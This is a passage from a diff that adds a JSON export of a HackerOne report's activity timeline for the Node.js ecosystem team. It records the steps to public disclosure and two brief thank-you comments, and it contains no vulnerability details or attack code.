+      "updated_at": "2019-02-07T21:22:20.075Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "skyn3t",
+        "url": "/skyn3t"
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4111937,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-02-07T21:22:27.760Z",
+      "updated_at": "2019-02-07T21:22:27.760Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4111939,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ManuallyDisclosed",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2019-02-07T21:22:35.433Z",
+      "updated_at": "2019-02-07T21:22:35.433Z",
+      "actor": {
+        "username": "marcinhoppe",
+        "cleared": false,
+        "verified": false,
+        "url": "/marcinhoppe",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4120733,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Thanks for disclosing @marcinhoppe \n@notquiteleo I've contacted you via twitter DM in case you didn't want to go the HackerOne way.",
+      "automated_response": false,
+      "created_at": "2019-02-09T17:01:30.898Z",
+      "updated_at": "2019-02-09T17:01:30.898Z",
+      "actor": {
+        "username": "skyn3t",
+        "cleared": false,
+        "verified": false,
+        "url": "/skyn3t",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/224/816/14988b1087907275d769481dc45fe6576ce0d206_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    },
+    {
+      "id": 4136681,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Awesome, thanks!",
+      "automated_response": false,
+      "created_at": "2019-02-12T16:44:23.608Z",
+      "updated_at": "2019-02-12T16:44:23.608Z",
+      "actor": {
+        "username": "notquiteleo",
+        "cleared": false,
+        "verified": false,
+        "url": "/notquiteleo",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/234/441/a2d834813f466cd073def4b1f346275259f6522f_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "nodejs-ecosystem"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
